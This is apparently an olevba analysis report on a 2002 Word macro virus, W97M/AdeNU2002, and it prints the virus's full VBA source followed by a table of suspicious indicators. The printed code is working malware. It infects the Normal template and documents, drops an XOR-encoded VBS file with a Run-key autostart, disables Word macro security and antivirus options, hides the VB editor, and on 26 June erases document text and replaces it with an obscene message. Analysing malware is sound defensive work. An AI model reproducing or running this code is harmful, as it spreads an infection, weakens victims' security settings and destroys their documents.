olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Adenu-1df68ef0516f2caca31c8f7b703b32274b1ac8c8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Adenu-1df68ef0516f2caca31c8f7b703b32274b1ac8c8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AdeNU2002.bas 
in file: Virus.MSWord.Adenu-1df68ef0516f2caca31c8f7b703b32274b1ac8c8 - OLE stream: 'Macros/VBA/AdeNU2002'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function GetSystemDirectory Lib "kernel32" Alias "GetSystemDirectoryA" (ByVal lpBuffer As String, ByVal nSize As Long) As Long
Sub RepAdeNU2002(FileObj, Strng)
    On Error Resume Next
    Dim Cnt
    With FileObj.Add(1)
        .Name = "AdeNU2002"
        .Codemodule.Insertlines 1, Strng
        For Cnt = 1 To .Codemodule.CountOfLines
            If .Codemodule.Lines(Cnt, 1) = Empty Then
               .Codemodule.Deletelines Cnt, 1
            End If
        Next
    End With
End Sub
Function LookForAdeNU2002(MacObj, MAcCnt)
    On Error Resume Next
    Dim MacNme, CodCnt, Cnt
    LookForAdeNU2002 = True
    For Cnt = 1 To MAcCnt
        CodCnt = MacObj.Item(Cnt).Codemodule.CountOfLines
        If MacObj.Item(Cnt).Name = "AdeNU2002" Then
            If CodCnt = 0 Then
                MacObj.Remove (MacObj.Item(Cnt))
            Else
                LookForAdeNU2002 = False
            End If
        Else
            If CodCnt <> 0 Then
                MacObj.Item(Cnt).Codemodule.Deletelines 1, CodCnt
            End If
        End If
    Next
End Function
Sub DoVBS(Cont As Object, Path As String)
    On Error Resume Next
    Dim Code As String, I, Code2
    Code = Cont.Lines(1, Cont.CountOfLines)
    For I = 1 To Len(Code)
        Code2 = Code2 & Chr(Asc(Right(Left(Code, I), 1)) Xor 6)
    Next
    Code2 = "GbcHS = " & Chr(34) & Code2 & Chr(34)
    Open Path For Output As #1
        Print #1, Code2
        Print #1, "For I = 1 to Len(GbcHS)" + Chr(10) + "Code = Code & Chr(Asc(Right(Left(GbcHS, I), 1)) Xor 6)" + Chr(10) + "Next"
        Print #1, "On Error Resume Next" + Chr(10) + "Set MSW = CreateObject(" + Chr(34) + "Word.Application" + Chr(34) + ")" + Chr(10); "Set NTT = MSW.NormalTemplate.VBProject.VBComponents"
        Print #1, "If LookForAdeNU2002(NTT, NTT.Count) Then RepAdeNU2002 NTT, Code : MSW.NormalTemplate.Save" + Chr(10) + "Set NTT = Nothing" + Chr(10) + "MSW.Quit"
        Print #1, Cont.Lines(Cont.ProcStartLine("RepAdeNU2002", 0), Cont.ProcCountLines("RepAdeNU2002", vbext_pk_Proc) + Cont.ProcCountLines("LookForAdeNU2002", 0))
    Close #1
End Sub
Sub AdeNU2002Hide()
    On Error Resume Next
    ShowVisualBasicEditor = False
    CustomizationContext = NormalTemplate
    FindKey(BuildKeyCode(122, 1024)).Disable
    FindKey(BuildKeyCode(119, 1024)).Disable
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = &O1
    With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
    End With
    With CommandBars("Visual Basic")
        .Visible = False
        .Enabled = False
        .Protection = 8
        .Protection = 1
    End With
    With CommandBars("Tools")
        .Controls("Macro").Enabled = (26 - 26)
        .Controls("Customize...").Enabled = (26 - 26)
        .Controls("Templates and Add-ins...").Enabled = (26 - 26)
    End With
End Sub
Sub AdeNU2002show()
    On Error Resume Next
    Dim Bmsg As String
    If Month(Now) = 6 And Day(Now) = 26 Then
        If Documents.Count = 0 Then Documents.Add
        Bmsg = "MESSAGE TO THE FUCKING PUBLIC" & vbCrLf & vbCrLf
        Cmsg = "Mga walang hiya kayong mga nasa poder ng Ateneo de Naga University, " & _
               "Ang paplastik n'yo mga putang ina n'yo, " & _
               "Kayo'y nagtatago sa kabanalan, mga sato't santita na puro " & _
               "kaplastikan ang alam, Mga akala mo kung sino " & _
               "puro YABANG lang naman, Mga mapoporma hanggang porma lang naman ..." & vbCrLf & vbCrLf
        SigM = "W97M/AdeNU2002" & vbCrLf & _
               "Copyright(C)2002 KALANTURA of AdeNU" & vbCrLf & "Naga City Philippines" & vbCrLf
        With Options
            .CheckGrammarAsYouType = False
            .CheckSpellingAsYouType = False
        End With
        With Selection
            .WholeStory
            .Delete Unit:=1, Count:=1
            .Paragraphs.Alignment = 0
            .Font.Size = 12
            .Font.Bold = True
            .Font.Underline = 6
            .TypeParagraph
            .TypeText Bmsg
            .Font.Bold = False
            .Font.Underline = 0
            .Paragraphs.Alignment = 3
            .TypeParagraph
            .TypeText Cmsg
            .Paragraphs.Alignment = 2
            .TypeText SigM
        End With
        If Right(Left(ActiveDocument.FullName, 3), 2) = ":\" Then ActiveDocument.SaveAs (ActiveDocument.FullName)
    End If
End Sub
Sub AdeNU2002()
' AdeNU2002 Virus
' Copyright(C)2002 KALANTURA
' Libmanan Camarines Sur
' [u2tr4v1023t]
    On Error Resume Next
    Application.EnableCancelKey = 0
    Call AdeNU2002Hide
    Dim MCont As Object, NTemp As Object, ADoct As Object, AdeNU2002Str As String
    Dim GetSys As String * 128, SysPathLen As Long, FileFullName As String
    Set MCont = MacroContainer.VBProject.VBComponents.Item("AdeNU2002").Codemodule
    Set NTemp = NormalTemplate.VBProject.VBComponents
    Set ADoct = ActiveDocument.VBProject.VBComponents
    FileFullName = Left(GetSys, GetSystemDirectory(GetSys, 128)) & "\GbcHS4664.VBS"
    If Dir(FileFullName) = "" Then
        DoVBS MCont, FileFullName
    End If
    If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "GbcHS4664") <> FileFullName Then
        System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\", "GbcHS4664") = FileFullName
    End If
    AdeNU2002Str = MCont.Lines(1, MCont.CountOfLines)
    If LookForAdeNU2002(NTemp, NTemp.Count) Then
        RepAdeNU2002 NTemp, AdeNU2002Str
        NormalTemplate.Save
    End If
    If LookForAdeNU2002(ADoct, ADoct.Count) Then
        RepAdeNU2002 ADoct, AdeNU2002Str
        If Right(Left(ActiveDocument.FullName, 3), 2) = ":\" Then ActiveDocument.SaveAs (ActiveDocument.FullName)
    End If
    AdeNU2002show
    Application.EnableCancelKey = 1
End Sub
Sub ViewVbCode()
    On Error Resume Next
    Application.Quit
End Sub
Sub AutoExec()
    On Error Resume Next
    AdeNU2002Hide
End Sub
Sub AutoOpen()
    On Error Resume Next
    AdeNU2002
End Sub
Sub AutoClose()
    On Error Resume Next
    AdeNU2002
End Sub
Sub FilePrint()
    On Error Resume Next
    AdeNU2002
    Dialogs(88).Show
End Sub
Sub FileClose()
    On Error Resume Next
    AdeNU2002
    If (ActiveDocument.Saved = False) Then
    ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    AdeNU2002
    Dialogs(84).Show
End Sub
Sub FileSave()
    On Error Resume Next
    AdeNU2002
    ActiveDocument.Save
End Sub
' [AdeNU2002]
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |GbcHS4664.VBS       |Executable file name                         |
+----------+--------------------+---------------------------------------------+

